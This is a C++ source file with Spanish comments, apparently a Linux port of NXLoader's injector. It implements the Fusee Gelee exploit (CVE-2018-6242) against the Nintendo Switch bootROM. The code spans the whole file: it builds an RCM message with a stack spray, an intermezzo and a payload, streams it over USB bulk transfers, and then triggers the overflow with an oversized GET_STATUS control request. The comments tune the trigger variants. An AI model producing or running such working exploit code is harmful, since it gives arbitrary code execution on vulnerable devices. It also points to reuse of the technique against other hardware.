// launcher_rcm.cpp, Motor de inyeccion Fusee Gelee para Linux
// Replicacion EXACTA del motor de NXLoader (PrimaryLoader.java + native-lib.cpp,
// David Buchanan / eliboa), que esta validado funcionando en la unidad del usuario.
// Basado en fusee gelee (CVE-2018-6242) por Kate Temkin / ReSwitched.
// Compilar: g++ -O2 -o launcher_rcm launcher_rcm.cpp
// Uso: launcher_rcm <device_path> <payload_path> [intermezzo_path]

#include <cstdio>
#include <cstring>
#include <cstdlib>
#include <cerrno>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <linux/usbdevice_fs.h>
#include <linux/usb/ch9.h>
#include <stdint.h>

static const uint32_t RCM_PAYLOAD_ADDR  = 0x40010000;
static const uint32_t INTERMEZZO_LOCATION = 0x4001F000;
static const uint32_t PAYLOAD_LOAD_BLOCK = 0x40020000;
static const uint32_t MAX_LENGTH        = 0x30298;

static void put_u32_le(uint8_t *p, uint32_t v) {
    p[0] = v & 0xFF; p[1] = (v >> 8) & 0xFF; p[2] = (v >> 16) & 0xFF; p[3] = (v >> 24) & 0xFF;
}

static int trigger_exploit(int fd, int length, int mode) {
    int buf_size = sizeof(struct usb_ctrlrequest) + length;
    void *buffer = calloc(1, buf_size);
    struct usbdevfs_urb *purb = nullptr;

    struct usb_ctrlrequest *ctrl_req = (struct usb_ctrlrequest *) buffer;
    // CRITICO: el PoC oficial (ktemkin) dispara el overflow con recipient ENDPOINT
    // (0x82). GET_STATUS + INTERFACE (0x81, como NXLoader) NO esta en la lista de
    // handlers vulnerables del bootROM, el overflow del stack no desencadena.
    ctrl_req->bRequestType = USB_DIR_IN | USB_RECIP_ENDPOINT;
    ctrl_req->bRequest = USB_REQ_GET_STATUS;
    ctrl_req->wLength = length;

    struct usbdevfs_urb urb = {};
    urb.type = USBDEVFS_URB_TYPE_CONTROL;
    urb.endpoint = 0;
    urb.buffer = buffer;
    urb.buffer_length = buf_size;
    urb.usercontext = (void *) 0x1337;

    if (mode == 1) {
        // Variante control sincrono: USBDEVFS_CONTROL (el setup viaja seguro,
        // el overflow ocurre en el device al procesar el wLength gigante).
        struct usbdevfs_ctrltransfer ctrl = {};
        ctrl.bRequestType = USB_DIR_IN | USB_RECIP_ENDPOINT;
        ctrl.bRequest = USB_REQ_GET_STATUS;
        ctrl.wValue = 0;
        ctrl.wIndex = 0;
        ctrl.wLength = length;
        ctrl.timeout = 2000;
        ctrl.data = buffer + sizeof(struct usb_ctrlrequest);
        int r = ioctl(fd, USBDEVFS_CONTROL, &ctrl);
        free(buffer);
        return r < 0 ? -5 : 0;
    }

    // PoC oficial (ktemkin, report/fusee_gelee.md): SOLO SUBMITURB, el setup
    // packet viaja al device en el momento del submit y el overflow ocurre en el
    // device. NO hacer DISCARDURB: en Linux desktop la cancelacion gana la carrera
    // y el setup nunca se transmite (el error de NXLoader/Android no aplica aca).
    // No esperar completacion: el device murio; cerrar el fd cancela el URB.
    if (ioctl(fd, USBDEVFS_SUBMITURB, &urb) < 0) { free(buffer); return -1; }
    free(buffer);
    return 0;
}

static int bulk_transfer(int fd, unsigned int ep, void *data, unsigned int len, unsigned int timeout) {
    struct usbdevfs_bulktransfer bulk = {};
    bulk.ep = ep;
    bulk.len = len;
    bulk.timeout = timeout;
    bulk.data = data;
    return ioctl(fd, USBDEVFS_BULK, &bulk);
}

int main(int argc, char **argv) {
    if (argc < 3) {
        fprintf(stderr, "uso: %s <device_path> <payload_path> [intermezzo_path] [--no-discard|--control]\n", argv[0]);
        return 1;
    }
    const char *dev_path = argv[1];
    const char *payload_path = argv[2];
    const char *intermezzo_path = (argc > 3 && argv[3][0] != '-') ? argv[3] : "/home/axel/.local/tools/intermezzo.bin";
    int trigger_mode = 0;
    for (int i = 3; i < argc; i++) {
        if (strcmp(argv[i], "--no-discard") == 0) trigger_mode = 2;
        if (strcmp(argv[i], "--control") == 0) trigger_mode = 1;
    }

    int fd = open(dev_path, O_RDWR);
    if (fd < 0) { fprintf(stderr, "[-] no se pudo abrir %s: %s\n", dev_path, strerror(errno)); return 1; }
    int r = 0;

    // IMPORTANTE: SETCONFIGURATION debe ir ANTES de CLAIMINTERFACE.
    // El kernel (devio.c: proc_setconfig) rechaza el ioctl con -EBUSY si
    // CUALQUIER interfaz esta actualmente claimeada (sin importar por que fd),
    // asi que llamarlo despues de CLAIMINTERFACE fallaba en silencio (el
    // codigo no chequeaba el valor de retorno) y el "reset barato" que hace
    // el kernel cuando el config pedido ya es el activo (usb_reset_configuration,
    // que limpia toggles/halt de los endpoints) nunca se ejecutaba. Esto es lo
    // que pyusb hace bien: set_configuration() se llama antes de claimear.
    int cfg = 1;
    if (ioctl(fd, USBDEVFS_SETCONFIGURATION, &cfg) < 0) {
        fprintf(stderr, "[!] set_configuration fallo (no fatal): %s\n", strerror(errno));
    }

    unsigned int ifnum = 0;
    if (ioctl(fd, USBDEVFS_CLAIMINTERFACE, &ifnum) < 0) {
        fprintf(stderr, "[-] claim interface fallo: %s\n", strerror(errno));
        return 1;
    }

    // Ahora si el endpoint quedo con un STALL real (no cubierto por el
    // reset de configuracion anterior), lo limpiamos.
    unsigned int ep_in = 0x81;
    unsigned int ep_out = 0x01;
    ioctl(fd, USBDEVFS_CLEAR_HALT, &ep_in);
    ioctl(fd, USBDEVFS_CLEAR_HALT, &ep_out);
    printf("[+] interface reclamada (%s)\n", dev_path);

    /* Step 1: leer device ID (bulk IN, endpoint 0x81) */
    uint8_t device_id[16] = {};
    r = bulk_transfer(fd, 0x81, device_id, 16, 999);
    if (r < 0 && errno == EPIPE) {
        // endpoint stalled: clear halt y reintentar (como libusb)
        ioctl(fd, USBDEVFS_CLEAR_HALT, &ep_in);
        r = bulk_transfer(fd, 0x81, device_id, 16, 999);
    }
    if (r != 16) { fprintf(stderr, "[-] fallo al leer device ID (%d): %s\n", r, strerror(errno)); return 1; }
    printf("[+] Device ID: ");
    for (int i = 0; i < 16; i++) printf("%02x", device_id[i]);
    printf("\n");

    /* Step 2: armar payload (igual que PrimaryLoader.java) */
    FILE *f = fopen(intermezzo_path, "rb");
    if (!f) { fprintf(stderr, "[-] no se pudo abrir intermezzo: %s\n", intermezzo_path); return 1; }
    fseek(f, 0, SEEK_END); long iz_len = ftell(f); fseek(f, 0, SEEK_SET);
    uint8_t *intermezzo = (uint8_t *) malloc(iz_len);
    if (fread(intermezzo, 1, iz_len, f) != (size_t) iz_len) { fprintf(stderr, "[-] intermezzo corto\n"); return 1; }
    fclose(f);

    f = fopen(payload_path, "rb");
    if (!f) { fprintf(stderr, "[-] no se pudo abrir payload: %s\n", payload_path); return 1; }
    fseek(f, 0, SEEK_END); long payload_len = ftell(f); fseek(f, 0, SEEK_SET);
    uint8_t *payload_data = (uint8_t *) malloc(payload_len);
    if (fread(payload_data, 1, payload_len, f) != (size_t) payload_len) { fprintf(stderr, "[-] payload corto\n"); return 1; }
    fclose(f);
    printf("[+] payload: %ld bytes, intermezzo: %ld bytes\n", payload_len, iz_len);

    uint8_t *buf = (uint8_t *) calloc(1, MAX_LENGTH);
    size_t pos = 0;
    put_u32_le(buf + pos, MAX_LENGTH); pos += 4;
    memset(buf + pos, 0, 676); pos += 676;                 // header RCM v4+ (680 bytes)
    for (uint32_t a = RCM_PAYLOAD_ADDR; a < INTERMEZZO_LOCATION; a += 4) {
        put_u32_le(buf + pos, INTERMEZZO_LOCATION); pos += 4;  // stack spray
    }
    memcpy(buf + pos, intermezzo, iz_len); pos += iz_len;   // intermezzo en 0x4001F000
    size_t pad = PAYLOAD_LOAD_BLOCK - INTERMEZZO_LOCATION - iz_len;
    memset(buf + pos, 0, pad); pos += pad;                  // padding hasta 0x40020000
    memcpy(buf + pos, payload_data, payload_len); pos += payload_len; // payload

    size_t unpadded_length = pos;
    printf("[+] mensaje armado: %zu bytes\n", unpadded_length);

    /* Step 3: enviar en chunks de 0x1000, alternando low/high buffer */
    uint8_t chunk[0x1000];
    bool low_buffer = true;
    size_t bytes_sent = 0;
    for (; bytes_sent < unpadded_length || low_buffer; bytes_sent += 0x1000) {
        memcpy(chunk, buf + bytes_sent, 0x1000);
        int attempts = 0;
        do {
            r = bulk_transfer(fd, 0x01, chunk, 0x1000, 999);
            if (r < 0 && errno == EPIPE && attempts < 5) {
                // endpoint OUT stalled: clear halt y reintentar (como libusb)
                ioctl(fd, USBDEVFS_CLEAR_HALT, &ep_out);
                attempts++;
                continue;
            }
            break;
        } while (true);
        if (r != 0x1000) {
            fprintf(stderr, "[-] envio fallo en offset %zu (%d): %s\n", bytes_sent, r, strerror(errno));
            return 1;
        }
        low_buffer = !low_buffer;
    }
    printf("[+] enviados %zu bytes\n", bytes_sent);

    /* Step 4: trigger del exploit (control GET_STATUS wLength=0x7000 + URB discard) */
    printf("[*] trigger mode %d (0=discard como NXLoader, 1=control sync, 2=sin discard)\n", trigger_mode);
    int tr = trigger_exploit(fd, 0x7000, trigger_mode);
    if (tr == 0) printf("[+] trigger completado (codigo 0)\n");
    else { fprintf(stderr, "[-] trigger fallo (codigo %d)\n", tr); return 1; }

    /* Diagnostico post-trigger: el RCM sigue vivo? */
    printf("[*] chequeando estado del RCM 500ms post-trigger...\n");
    usleep(500000);
    uint8_t probe[16] = {};
    int pr = bulk_transfer(fd, 0x81, probe, 16, 500);
    if (pr == 16) {
        printf("[-] RCM SIGUE VIVO: el overflow NO se disparo (o el payload no corrio).\n");
        printf("[-] El trigger con este modo no mato el stack USB. Probar otra variante.\n");
        close(fd);
        return 2;
    }
    printf("[+] RCM no responde post-trigger (read: %d): overflow disparado o RCM apagado.\n", pr);
    printf("[+] Si la Switch no arranco el payload, el problema es el armado, no el trigger.\n");

    close(fd);
    return 0;
}
